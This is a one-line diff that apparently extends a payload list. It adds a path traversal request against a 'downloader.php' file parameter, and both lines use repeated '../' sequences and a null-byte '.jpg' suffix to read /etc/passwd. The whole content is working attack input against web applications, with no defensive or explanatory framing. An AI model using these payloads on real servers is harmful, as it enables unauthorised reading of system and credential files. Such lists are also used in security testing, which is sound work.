@@ -1,1 +1,2 @@
 /downloader.php?file=../../../../../../../../../../../../../etc/passwd%00.jpg
+/downloader.php?file=../../../../../../../../../../etc/passwd%00.jpg
